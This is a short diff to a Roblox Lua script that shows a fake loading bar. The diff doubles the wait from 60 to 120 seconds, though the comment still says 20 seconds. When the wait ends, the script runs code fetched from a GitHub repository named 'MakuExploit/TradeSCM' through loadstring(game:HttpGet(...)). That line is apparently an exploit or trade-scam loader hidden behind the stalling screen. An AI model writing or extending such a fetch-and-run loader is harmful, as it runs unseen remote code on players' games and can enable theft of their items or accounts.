@@ -105,11 +105,11 @@ barGradient.Transparency = NumberSequence.new{
 }
 
 -- ⏳ 20-SECOND LOADING
-TweenService:Create(ProgressBar, TweenInfo.new(60), {
+TweenService:Create(ProgressBar, TweenInfo.new(120), {
     Size = UDim2.new(1, 0, 1, 0)
 }):Play()
 
-task.delay(60, function()
+task.delay(120, function()
     Frame:Destroy()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MakuExploit/TradeSCM/refs/heads/main/Tradescm"))()
 end)
